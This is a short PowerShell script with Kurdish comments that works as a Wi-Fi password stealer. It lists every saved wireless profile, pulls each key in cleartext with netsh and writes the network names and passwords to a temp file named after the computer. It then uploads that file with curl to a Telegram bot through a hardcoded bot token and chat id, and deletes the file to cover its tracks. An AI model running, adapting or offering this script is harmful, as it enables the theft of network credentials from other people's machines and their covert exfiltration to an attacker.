# وەرگرتنی ناوی کۆمپیوتەر
$compName = $env:COMPUTERNAME
$token = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$id = "8597805144"

# دروستکردنی ناوی فایلەکە بەپێی ناوی کۆمپیوتەرەکە
$fileName = "$($compName)_wifi.txt"
$p = "$env:TEMP\$fileName"

if (Test-Path $p) { rm $p -Force }

netsh wlan show profiles | Select-String ":(.+)$" | % {
    $n = $_.Matches.Groups[1].Value.Trim()
    $c = netsh wlan show profile name="$n" key=clear
    $m = $c | Select-String "Key Content\W+:(.+)$"
    if ($m) {
        $pass = $m.Matches.Groups[1].Value.Trim()
        "$n : $pass" | Out-File $p -Append -Encoding utf8
    }
}

if (Test-Path $p) {
    # ناردنی فایلەکە بە ناوە نوێیەکەیەوە
    curl.exe -F "document=@$p" "https://api.telegram.org/bot$token/sendDocument?chat_id=$id"
    rm $p -Force
}
exit
